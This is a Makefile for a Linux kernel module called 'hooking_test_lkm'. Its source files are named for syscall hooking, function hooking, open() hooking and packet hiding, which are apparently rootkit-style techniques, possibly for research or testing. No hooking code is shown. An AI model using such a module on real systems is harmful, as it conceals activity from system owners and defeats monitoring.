# Module name
KERNEL_MODULE		:= hooking_test_lkm

# Build
MODULEDIR	:= /lib/modules/$(shell uname -r)
BUILDDIR	:= $(MODULEDIR)/build
KERNELDIR 	:= $(MODULEDIR)/kernel

# Source files
SRCS_S 		:= src

# Header files
SRCS_H		:= $(PWD)/src/headers

# Module
obj-m 		:= $(KERNEL_MODULE).o

# Kernel Module
$(KERNEL_MODULE)-y 	+= hooking_test.o

# Source
$(KERNEL_MODULE)-y 	+= src/new_kln.o
$(KERNEL_MODULE)-y 	+= src/syscall_hooking.o
$(KERNEL_MODULE)-y 	+= src/packet_hide.o
$(KERNEL_MODULE)-y 	+= src/function_hooking.o
$(KERNEL_MODULE)-y 	+= src/open_hook.o


ccflags-y	:= -I$(SRCS_H) 

all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules
